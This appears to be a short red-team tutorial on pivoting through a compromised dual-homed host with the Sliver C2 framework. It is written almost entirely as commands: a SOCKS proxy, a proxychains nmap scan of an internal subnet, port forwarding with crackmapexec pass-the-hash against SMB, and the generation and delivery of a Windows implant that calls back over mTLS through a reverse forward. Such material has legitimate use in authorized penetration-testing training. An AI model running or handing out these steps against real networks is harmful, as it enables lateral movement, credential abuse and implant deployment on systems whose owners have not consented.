## Pivoting Workflow Example

You have a C2 session on a dual-homed host. Discover and exploit internal targets.

### Step 1: Discover internal interfaces
```bash
sliver [session] > ifconfig
# Look for additional interfaces on different subnets
```

### Step 2: Start SOCKS proxy
```bash
sliver [session] > socks5 start --port 1080
```

### Step 3: Scan internal subnet
```bash
proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389,5985 --open
```

### Step 4: Port forward for targeted exploitation
```bash
sliver [session] > portfwd add --remote 10.0.0.5:445 --bind 127.0.0.1:8445
crackmapexec smb 127.0.0.1 --port 8445 -u admin -H NTLM_HASH
```

### Step 5: Deploy internal implant
```bash
sliver [session] > rportfwd add --remote 0.0.0.0:9999 --bind 127.0.0.1:8888
sliver > generate --mtls 10.0.0.10:9999 --os windows --arch amd64 --save /tmp/internal.exe
# Deliver via SMB or WinRM through the forward
```
